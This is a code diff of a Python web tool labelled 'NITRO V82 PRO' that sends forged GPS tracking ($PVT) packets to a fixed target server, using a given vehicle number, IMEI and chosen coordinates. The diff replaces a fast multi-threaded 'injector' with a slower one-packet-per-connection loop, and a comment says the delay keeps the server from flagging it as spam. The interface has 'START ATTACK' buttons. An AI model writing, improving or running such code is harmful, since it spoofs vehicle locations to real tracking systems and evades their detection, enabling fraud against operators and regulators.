@@ -25,37 +25,42 @@ def format_coord(val):
     p = str(val).split('.')
     return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
 
-# --- KALI STYLE DIRECT INJECTOR ---
-def start_firing(tag_chunk, imei, vno, lat, lon):
+# --- SEQUENTIAL HANDSHAKE ENGINE ---
+def start_firing(imei, vno, lat, lon):
     global firing, total_sent, logs
     while firing:
-        try:
-            # Sockets settings exactly like Kali's default
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            s.settimeout(10)
-            s.connect((TARGET_IP, TARGET_PORT))
-            
-            while firing:
-                for tag in tag_chunk:
-                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
-                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
-                    
-                    # Exact hardware string pattern
-                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
-                    
-                    # Direct binary send to bypass cloud formatting
-                    s.sendall(bytes(pkt, 'ascii'))
-                    total_sent += 1
+        for tag in TAGS:
+            if not firing: break
+            try:
+                # 1. Establish Handshake (New Connection per Tag)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect((TARGET_IP, TARGET_PORT))
                 
-                logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] INJECTED: {len(tag_chunk)} TAGS")
+                # 2. Prepare Valid Packet
+                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
+                dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
+                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
+                
+                # 3. Send & Wait for Buffer Clearance
+                s.sendall(bytes(pkt, 'ascii'))
+                total_sent += 1
+                
+                # 4. Graceful Close (Completes Handshake)
+                s.close()
+                
+                logs.append(f"[{tm}] {tag} -> HANDSHAKE_OK")
                 if len(logs) > 8: logs.pop(0)
-                time.sleep(0.01) # Ultra Fast
-        except: time.sleep(1)
-        finally: s.close()
+                
+                # Chhota delay taaki server spam na samjhe
+                time.sleep(0.5) 
+            except Exception as e:
+                logs.append(f"ERR: {tag} - RECONNECTING")
+                time.sleep(1)
 
 @app.get("/", response_class=HTMLResponse)
 async def home():
+    # UI Code remains same as before for consistency
     return """
     <html><head><title>NITRO V82 PRO</title><style>
     body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
@@ -69,7 +74,7 @@ async def home():
         <h2>NITRO V82 PRO</h2>
         <input type="text" id="v" value="UP51T8261"><input type="text" id="i" value="358980101447242">
         <input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780">
-        <button onclick="st()">START ATTACK</button>
+        <button onclick="st()">START SEQUENTIAL ATTACK</button>
         <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
         <div id="log">SYSTEM READY</div>
         <div style="margin-top:10px;">SENT: <b id="c">0</b></div>
@@ -89,8 +94,7 @@ async def home():
 @app.get("/init")
 def init(v:str, i:str, lt:str, ln:str):
     global firing, total_sent; firing=True; total_sent=0
-    chunks = [TAGS[x:x+4] for x in range(0, len(TAGS), 4)]
-    for c in chunks: threading.Thread(target=start_firing, args=(c, i, v.upper(), lt, ln), daemon=True).start()
+    threading.Thread(target=start_firing, args=(i, v.upper(), lt, ln), daemon=True).start()
     return {"ok":True}
 
 @app.get("/stop")
